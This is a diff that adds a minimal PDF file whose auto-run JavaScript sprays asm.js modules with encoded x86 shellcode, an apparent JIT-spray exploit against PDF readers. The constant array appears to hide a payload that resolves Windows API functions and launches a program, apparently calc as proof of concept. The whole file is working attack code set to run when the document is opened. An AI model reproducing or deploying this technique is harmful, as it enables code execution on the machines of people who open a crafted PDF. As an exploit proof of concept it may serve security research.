@@ -1,0 +1,143 @@
+%PDF 
+1 0 obj
+<</Pages 1 0 R /OpenAction 2 0 R>> 
+2 0 obj
+<</S /JavaScript /JS (
+var sprayArr = [];
+
+// store sprayed asm.js modules
+var asmJsModulesArr = [];
+function sprayJITShellcode(asmJsModuleName, payloadFuncName) {
+	var script = ''+
+	'function ffi_func2 (arr){'+
+		'var val =0;'+
+		'for(var i = 0; i < arr.length; i++){'+
+			'val = (val + arr[i])|0;'+
+		'}'+
+		'return val|0;'+
+	'}' +
+
+	'function ' + asmJsModuleName + '(stdlib,heap){'+
+		'"use asm";'+
+		'var arrz = ['+
+					'0xa8909090|0,'+
+                    '0xa8909090|0,'+
+                    '0xa8909090|0,'+
+                    '0xa890d6ff|0,'+
+                    '0xa890006a|0,'+
+                    '0xa890d7ff|0,'+
+                    '0xa851056a|0,'+
+                    '0xa890e189|0,'+
+                    '0xa85161b5|0,'+
+                    '0xa89063b1|0,'+
+                    '0xa890636c|0,'+
+                    '0xa8b99051|0,'+
+                    '0xa8c9315e|0,'+
+                    '0xa850f631|0,'+
+                    '0xa890d6ff|0,'+
+                    '0xa890c789|0,'+
+                    '0xa8ff3157|0,'+
+                    '0xa851e189|0,'+
+                    '0xa85178b5|0,'+
+                    '0xa89045b1|0,'+
+                    '0xa8907469|0,'+
+                    '0xa8b99090|0,'+
+                    '0xa85172b5|0,'+
+                    '0xa89050b1|0,'+
+                    '0xa890636f|0,'+
+                    '0xa8b99090|0,'+
+                    '0xa85173b5|0,'+
+                    '0xa89065b1|0,'+
+                    '0xa8900073|0,'+
+                    '0xa8b99090|0,'+
+                    '0xa851c931|0,'+
+                    '0xa8d2ff53|0,'+
+                    '0xa851e189|0,'+
+                    '0xa85169b5|0,'+
+                    '0xa89057b1|0,'+
+                    '0xa890456e|0,'+
+                    '0xa8b99090|0,'+
+                    '0xa85165b5|0,'+
+                    '0xa89078b1|0,'+
+                    '0xa8900063|0,'+
+                    '0xa8b99090|0,'+
+                    '0xa851c931|0,'+
+                    '0xa8905f53|0,'+
+                    '0xa8ff315e|0,'+
+                    '0xa852f631|0,'+
+                    '0xa890da01|0,'+
+                    '0xa88e148b|0,'+
+                    '0xa890de01|0,'+
+                    '0xa81c728b|0,'+
+                    '0xa8909049|0,'+
+                    '0xa80e8b66|0,'+
+                    '0xa890ce01|0,'+
+                    '0xa890e1d1|0,'+
+                    '0xa890de01|0,'+
+                    '0xa824728b|0,'+
+                    '0xa8598deb|0,'+
+                    '0xa85905eb|0,'+
+                    '0xa804759d|0,'+
+                    '0xa89c0839|0,'+
+                    '0xa89064b5|0,'+
+                    '0xa89064b1|0,'+
+                    '0xa8906572|0,'+
+                    '0xa8b99090|0,'+
+                    '0xa804c083|0,'+
+                    '0xa827759d|0,'+
+                    '0xa89c0839|0,'+
+                    '0xa8906fb5|0,'+
+                    '0xa89072b1|0,'+
+                    '0xa8904163|0,'+
+                    '0xa8b99090|0,'+
+                    '0xa804c083|0,'+
+                    '0xa84a759d|0,'+
+                    '0xa89c0839|0,'+
+                    '0xa89065b5|0,'+
+                    '0xa89047b1|0,'+
+                    '0xa8905074|0,'+
+                    '0xa8b9d801|0,'+
+                    '0xa89051ad|0,'+
+                    '0xa841c931|0,'+
+                    '0xa890de01|0,'+
+                    '0xa820728b|0,'+
+                    '0xa890da01|0,'+
+                    '0xa878528b|0,'+
+                    '0xa890da01|0,'+
+                    '0xa83c538b|0,'+
+                    '0xa810588b|0,'+
+                    '0xa8ad96ad|0,'+
+                    '0xa814708b|0,'+
+                    '0xa80c408b|0,'+
+                    '0xa8008b64|0,'+
+                    '0xa858306a|0,'+
+                    '0xa890c931|0,'+
+                    '0xa8909090|0,'+
+                    '0x19b447a2|0,'+
+		'];'+
+		'function ' + payloadFuncName + '() {'+
+			'var val = 0;'+
+			'val = ffi_func2(arrz);'+
+			'return val|0;'+
+		'}'+
+		'return '  + payloadFuncName + ';'+
+	'}'+
+	
+	
+
+	'for (var f=0; f<0x10; f++) {'+
+		//'app.alert(util.printf( ' + asmJsModuleName + '(this, { func: ' + ffiFuncName + '}, 0)'+  ' ));'+ 
+		'asmJsModulesArr.push(' + asmJsModuleName + '(this,0)); '+
+	'}'+
+	'';
+	eval(script);
+	asmJsModulesArr[asmJsModulesArr.length - 1]();
+
+}
+
+for (var jitCount = 0; jitCount < 0x8000; jitCount++) {
+  sprayJITShellcode("foo"+jitCount,"payload"+jitCount);
+}
+app.alert(util.printf("done"));
+
+)>> trailer <</Root 1 0 R>>
